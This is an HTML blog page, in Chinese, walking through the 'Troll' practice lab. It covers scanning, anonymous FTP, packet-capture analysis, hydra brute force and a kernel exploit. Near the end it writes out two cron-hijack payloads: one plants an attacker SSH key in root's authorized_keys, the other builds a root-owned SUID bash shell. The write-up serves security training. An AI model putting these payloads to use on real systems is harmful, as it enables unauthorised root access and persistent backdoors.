@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="思路：主机扫描发现开放端口服务——匿名登陆FTP，下载lol.pacp——wireshark分析找到文件路径——hydra爆破得到ssh用户名密码——提权：内核版本漏洞提权(定时任务提权) nmap或netdiscover进行主机发现 端口扫描 看到了三个开启的tcp端口 UDP扫描 服务扫描 得到了中间件或者协议的版本信息以及操作系统类型和版本 nikto和dirb扫描 看到里面提到robots">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Troll">
+<meta property="og:url" content="http://example.com/2023/06/26/Troll/index.html">
+<meta property="og:site_name" content="阿卡丽的神秘商店">
+<meta property="og:description" content="思路：主机扫描发现开放端口服务——匿名登陆FTP，下载lol.pacp——wireshark分析找到文件路径——hydra爆破得到ssh用户名密码——提权：内核版本漏洞提权(定时任务提权) nmap或netdiscover进行主机发现 端口扫描 看到了三个开启的tcp端口 UDP扫描 服务扫描 得到了中间件或者协议的版本信息以及操作系统类型和版本 nikto和dirb扫描 看到里面提到robots">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626192813401.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626193035047.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626193328142.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626193547292.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626202400256.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626202959230.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626203120299.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626203140833.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626203233627.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626203311441.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626203348437.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626195427841.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626203715440.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626204647080.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626204914996.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626205320375.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626205702559.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626210632560.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626210724641.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626210841619.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626211243631.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626211305138.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626211401959.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626211419598.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626211435189.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626212830576.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626212911064.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626213101991.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626214407208.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626215333063.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626220606669.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626220632829.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626220706720.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626221036422.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626221017556.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626222335313.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626223346868.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626223403905.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626223500536.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626223751396.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626225015030.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626225155802.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230626225343552.png">
+<meta property="og:image" content="http://example.com/2023/06/26/Troll/image-20230627122510260.png">
+<meta property="article:published_time" content="2023-06-26T10:08:30.000Z">
+<meta property="article:modified_time" content="2023-07-02T22:39:54.113Z">
+<meta property="article:author" content="akali">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/06/26/Troll/image-20230626192813401.png">
+
+<link rel="canonical" href="http://example.com/2023/06/26/Troll/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Troll | 阿卡丽的神秘商店</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">阿卡丽的神秘商店</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">上古时代的宝贝开卖了</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/gjy20001003" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/26/Troll/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="akali">
+      <meta itemprop="description" content="远赴人间惊鸿宴，一睹人间盛世颜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="阿卡丽的神秘商店">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Troll
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-06-26 18:08:30" itemprop="dateCreated datePublished" datetime="2023-06-26T18:08:30+08:00">2023-06-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-07-03 06:39:54" itemprop="dateModified" datetime="2023-07-03T06:39:54+08:00">2023-07-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>思路：主机扫描发现开放端口服务——匿名登陆FTP，下载lol.pacp——wireshark分析找到文件路径——hydra爆破得到ssh用户名密码——提权：内核版本漏洞提权(定时任务提权)</p>
+<h3 id="nmap或netdiscover进行主机发现"><a href="#nmap或netdiscover进行主机发现" class="headerlink" title="nmap或netdiscover进行主机发现"></a>nmap或netdiscover进行主机发现</h3><p><img src="/2023/06/26/Troll/image-20230626192813401.png" alt="image-20230626192813401"></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/2023/06/26/Troll/image-20230626193035047.png" alt="image-20230626193035047"></p>
+<p>看到了三个开启的tcp端口</p>
+<h3 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h3><p><img src="/2023/06/26/Troll/image-20230626193328142.png" alt="image-20230626193328142"></p>
+<h3 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h3><p><img src="/2023/06/26/Troll/image-20230626193547292.png" alt="image-20230626193547292"></p>
+<p>得到了中间件或者协议的版本信息以及操作系统类型和版本</p>
+<h3 id="nikto和dirb扫描"><a href="#nikto和dirb扫描" class="headerlink" title="nikto和dirb扫描"></a>nikto和dirb扫描</h3><p><img src="/2023/06/26/Troll/image-20230626202400256.png" alt="image-20230626202400256"></p>
+<p>看到里面提到robots.txt以及apache版本较老的信息，总之没有很多有用信息</p>
+<p><img src="/2023/06/26/Troll/image-20230626202959230.png" alt="image-20230626202959230"></p>
+<h3 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h3><p>发现有四个文件其中就有secret在上面nikto出现过的，一一查看</p>
+<p><img src="/2023/06/26/Troll/image-20230626203120299.png" alt="image-20230626203120299" style="zoom:50%;"><img src="/2023/06/26/Troll/image-20230626203140833.png" alt="image-20230626203140833"><br><img src="/2023/06/26/Troll/image-20230626203233627.png" alt="image-20230626203233627"><br><img src="/2023/06/26/Troll/image-20230626203311441.png" alt="image-20230626203311441" style="zoom: 33%;"><br><img src="/2023/06/26/Troll/image-20230626203348437.png" alt="image-20230626203348437"><br>没有权限</p>
+<h3 id="尝试ftp"><a href="#尝试ftp" class="headerlink" title="尝试ftp"></a>尝试ftp</h3><p><img src="/2023/06/26/Troll/image-20230626195427841.png" alt="image-20230626195427841"></p>
+<p>注意到ftp允许匿名登录，还有一个文件lol.pacp，是包文件，查看lol.pacp</p>
+<p><img src="/2023/06/26/Troll/image-20230626203715440.png" alt="image-20230626203715440"></p>
+<h3 id="wireshark分析包"><a href="#wireshark分析包" class="headerlink" title="wireshark分析包"></a>wireshark分析包</h3><p>使用wireshark打开包<br><img src="/2023/06/26/Troll/image-20230626204647080.png" alt="image-20230626204647080"><br>如图是登录时候的包<br><img src="/2023/06/26/Troll/image-20230626204914996.png" alt="image-20230626204914996"><br>SYST获取服务器操作系统，返回结果215 UNIX L8<br><img src="/2023/06/26/Troll/image-20230626205320375.png" alt="image-20230626205320375"><br>LIST列出所有文件<br><img src="/2023/06/26/Troll/image-20230626205702559.png" alt="image-20230626205702559"></p>
+<p><img src="/2023/06/26/Troll/image-20230626210632560.png" alt="image-20230626210632560"><img src="/2023/06/26/Troll/image-20230626210724641.png" alt="image-20230626210724641"><br>提到一个文件secret_stuff.txt,命令是RETR secret_styff.txt，返回sup3rs3cr3tdirlol</p>
+<h3 id="获得密码本和账号本"><a href="#获得密码本和账号本" class="headerlink" title="获得密码本和账号本"></a>获得密码本和账号本</h3><p>尝试访问该网址</p>
+<p><img src="/2023/06/26/Troll/image-20230626210841619.png" alt="image-20230626210841619"></p>
+<p>下载下来发现是一个可执行文件<br><img src="/2023/06/26/Troll/image-20230626211243631.png" alt="image-20230626211243631"></p>
+<p>发现新路径<br><img src="/2023/06/26/Troll/image-20230626211305138.png" alt="image-20230626211305138"></p>
+<p><img src="/2023/06/26/Troll/image-20230626211401959.png" alt="image-20230626211401959"></p>
+<p><img src="/2023/06/26/Troll/image-20230626211419598.png" alt="image-20230626211419598"></p>
+<p><img src="/2023/06/26/Troll/image-20230626211435189.png" alt="image-20230626211435189"></p>
+<h3 id="使用hydra进行爆破"><a href="#使用hydra进行爆破" class="headerlink" title="使用hydra进行爆破"></a>使用hydra进行爆破</h3><p><img src="/2023/06/26/Troll/image-20230626212830576.png" alt="image-20230626212830576"></p>
+<p><img src="/2023/06/26/Troll/image-20230626212911064.png" alt="image-20230626212911064"></p>
+<p>结果Pass.txt是密码</p>
+<p>使用ssh连接靶机<br><img src="/2023/06/26/Troll/image-20230626213101991.png" alt="image-20230626213101991"></p>
+<p>反弹shell获得可交互终端<br><img src="/2023/06/26/Troll/image-20230626214407208.png" alt="image-20230626214407208"></p>
+<h3 id="内核版本漏洞提权"><a href="#内核版本漏洞提权" class="headerlink" title="内核版本漏洞提权"></a>内核版本漏洞提权</h3><p>查看内核版本和系统版本<br><img src="/2023/06/26/Troll/image-20230626215333063.png" alt="image-20230626215333063"></p>
+<p>寻找合适exp</p>
+<p><img src="/2023/06/26/Troll/image-20230626220606669.png" alt="image-20230626220606669"></p>
+<p><img src="/2023/06/26/Troll/image-20230626220632829.png" alt="image-20230626220632829"></p>
+<p>查询37292.c本地路径并下载</p>
+<p><img src="/2023/06/26/Troll/image-20230626220706720.png" alt="image-20230626220706720"></p>
+<p><img src="/2023/06/26/Troll/image-20230626221036422.png" alt="image-20230626221036422"></p>
+<p>攻击机开启http服务</p>
+<p><img src="/2023/06/26/Troll/image-20230626221017556.png" alt="image-20230626221017556"></p>
+<p>靶机测换到tmp路径(所有用户都可以写入)，并下载exp</p>
+<p><img src="/2023/06/26/Troll/image-20230626222335313.png" alt="image-20230626222335313"></p>
+<p>获取root权限</p>
+<p><img src="/2023/06/26/Troll/image-20230626223346868.png" alt="image-20230626223346868"></p>
+<p><img src="/2023/06/26/Troll/image-20230626223403905.png" alt="image-20230626223403905"></p>
+<p>更改root密码</p>
+<p><img src="/2023/06/26/Troll/image-20230626223500536.png" alt="image-20230626223500536"></p>
+<h3 id="获得目标文件"><a href="#获得目标文件" class="headerlink" title="获得目标文件"></a>获得目标文件</h3><p><img src="/2023/06/26/Troll/image-20230626223751396.png" alt="image-20230626223751396"></p>
+<h3 id="定时计划提权"><a href="#定时计划提权" class="headerlink" title="定时计划提权"></a>定时计划提权</h3><p>此外发现ssh登录无操作的情况下会断开</p>
+<p><img src="/2023/06/26/Troll/image-20230626225015030.png" alt="image-20230626225015030"></p>
+<p>可以看到cleaner.py会定期清除tmp文件下内容，且所有人可写<br><img src="/2023/06/26/Troll/image-20230626225155802.png" alt="image-20230626225155802"></p>
+<p><img src="/2023/06/26/Troll/image-20230626225343552.png" alt="image-20230626225343552"><br>并且找到该文件每两分钟运行一次cleaner.py</p>
+<h4 id="ssh提权"><a href="#ssh提权" class="headerlink" title="ssh提权"></a>ssh提权</h4><p>改写cleaner.py构造payload</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/<span class="selector-tag">usr</span>/<span class="selector-tag">bin</span>/<span class="selector-tag">env</span> <span class="selector-tag">python</span></span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">os</span></span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">sys</span></span><br><span class="line"><span class="selector-tag">try</span>:</span><br><span class="line">    <span class="selector-tag">os</span><span class="selector-class">.system</span>(&#x27;mkdir /root/.ssh; chmod <span class="number">775</span> .ssh; echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDbImlDm0Hd4ul8o8sRPZ+PiOrlkFLIhw3lqLmxCFa1QOjsbuBtAbReBDpApdSmQGx+O9lP7nUnvrA0thyU5cLeuHC7f8eAXUrldc+cL+/<span class="number">9</span>++PZrdsX5Au2KfzJ9XAeYwvq0RIPdJpuiFtK/nayXJDk/Lpum9TjtoKFwMzpX9qkjsEc5t4Zxg46yIxjNo7QEMzqdMwgme63Dpm0CBSR3wbO3uDkn0ZmjlEc+<span class="number">8</span>/XaKfIwZuadKaCHsQGR65jdKaD1cDckbunVu1WJSFYLkFgISo31VsTIlwVtIZpv36QMsmEPMDclBNzFmcHvu8PcKyrydvsHZ8fNgABoXWNNVnyu7LT159ob9kB3goqWeYVPL5kJQ4BDjhMhjtB+rdxpgZ4+OPQzXXqFWAQdeV40Uw6lEXoDe1X+<span class="number">0</span>gzRjyR0QNwa0FDVQ0yaD8/<span class="number">2</span>DI5teBcNSkdJY0GNHEFcjcdMokTfsT/vxvVKEFpcd7uGZe1pCCdB7i97ZpsDCBy3Mqyhcw7EBrHl70= root<span class="variable">@kali</span></span><br><span class="line"> &gt;&gt; /root/.ssh/authorized_keys&#x27;)</span><br><span class="line"><span class="selector-tag">except</span>:</span><br><span class="line">    <span class="selector-tag">sys</span><span class="selector-class">.exit</span>()</span><br></pre></td></tr></table></figure>
+<p>该payload生成了一个文件/root/.ssh/authorized_keys，等待两分钟后cronlog触发cleaner.py就可以使用root直接登录靶机</p>
+<h4 id="文件特性提权"><a href="#文件特性提权" class="headerlink" title="文件特性提权"></a>文件特性提权</h4><p>构造两个文件分别是suid.c和suid.py</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudi.c</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># suid.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">    os.system(<span class="string">&#x27;chown root:root /tmp/suid; chmod 4777 /tmp/suid&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br></pre></td></tr></table></figure>
+<p>靶机通过wget获取文件到/tmp路径下，编译suid.c文件，将sudi.py写入/lib/log/cleaner.py中，等待suid的属组变成root，执行./suid即可</p>
+<p><img src="/2023/06/26/Troll/image-20230627122510260.png" alt="image-20230627122510260"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/06/25/WeakSessionIDS/" rel="prev" title="WeakSessionIDS">
+      <i class="fa fa-chevron-left"></i> WeakSessionIDS
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/06/26/FTP/" rel="next" title="FTP">
+      FTP <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap%E6%88%96netdiscover%E8%BF%9B%E8%A1%8C%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">nmap或netdiscover进行主机发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UDP%E6%89%AB%E6%8F%8F"><span class="nav-number">3.</span> <span class="nav-text">UDP扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F"><span class="nav-number">4.</span> <span class="nav-text">服务扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nikto%E5%92%8Cdirb%E6%89%AB%E6%8F%8F"><span class="nav-number">5.</span> <span class="nav-text">nikto和dirb扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6"><span class="nav-number">6.</span> <span class="nav-text">查看文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95ftp"><span class="nav-number">7.</span> <span class="nav-text">尝试ftp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wireshark%E5%88%86%E6%9E%90%E5%8C%85"><span class="nav-number">8.</span> <span class="nav-text">wireshark分析包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97%E5%AF%86%E7%A0%81%E6%9C%AC%E5%92%8C%E8%B4%A6%E5%8F%B7%E6%9C%AC"><span class="nav-number">9.</span> <span class="nav-text">获得密码本和账号本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8hydra%E8%BF%9B%E8%A1%8C%E7%88%86%E7%A0%B4"><span class="nav-number">10.</span> <span class="nav-text">使用hydra进行爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="nav-number">11.</span> <span class="nav-text">内核版本漏洞提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6"><span class="nav-number">12.</span> <span class="nav-text">获得目标文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9A%E6%97%B6%E8%AE%A1%E5%88%92%E6%8F%90%E6%9D%83"><span class="nav-number">13.</span> <span class="nav-text">定时计划提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ssh%E6%8F%90%E6%9D%83"><span class="nav-number">13.1.</span> <span class="nav-text">ssh提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%89%B9%E6%80%A7%E6%8F%90%E6%9D%83"><span class="nav-number">13.2.</span> <span class="nav-text">文件特性提权</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="akali"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">akali</p>
+  <div class="site-description" itemprop="description">远赴人间惊鸿宴，一睹人间盛世颜</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">100</span>
